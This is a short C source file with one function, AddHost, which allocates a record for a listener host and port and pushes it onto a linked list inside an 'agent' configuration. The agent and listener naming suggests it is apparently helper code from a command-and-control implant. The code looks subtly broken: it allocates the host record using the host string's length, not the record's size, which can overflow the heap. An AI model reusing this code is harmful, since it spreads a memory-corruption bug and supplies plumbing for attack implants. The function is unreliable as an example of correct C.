#include "ListManager.h"


pHostData AddHost(pAgent agent, LPWSTR host, SIZE_T size, INT port) {
	pHostData data = NULL;
	
	//generate memory to store our agent data in the heap.
	data = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, size);
	data->Host = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, size + sizeof(WCHAR));

	//store port
	data->Port = port;
	//host is alive
	data->Alive = TRUE;
	//set the host we just added to front of linked list.
	data->Next = agent->config->listenerConfig.Hosts;
	CopyMemory(data->Host, host, size); // copy our host string.
	//reset our config's linkedlist to our new host at the front of line.
	agent->config->listenerConfig.Hosts = data;
	return data;
}